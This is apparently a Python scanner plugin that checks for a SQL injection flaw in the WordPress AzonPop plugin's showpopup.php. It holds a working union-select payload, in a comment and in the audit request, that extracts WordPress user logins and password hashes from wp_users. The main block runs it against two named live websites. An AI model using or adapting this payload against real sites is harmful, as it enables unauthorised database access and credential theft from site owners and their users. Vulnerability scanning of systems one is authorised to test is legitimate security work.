#!/usr/bin/env python
import re
import urllib
# paylaod=wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(user_login)),0x3c2f62723e,unhex(hex(user_pass)))*/,4,5%20/*!00000from*/%20wp_users
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg+'wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(md5(1))),0x3c2f62723e,unhex(hex(user_pass)))*/,4,5%20/*!00000from*/%20wp_users'
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.laredmexicoelpaso.org/')[1])
    audit(assign('wordpress', 'http://arthritispain.siterubix.com/')[1])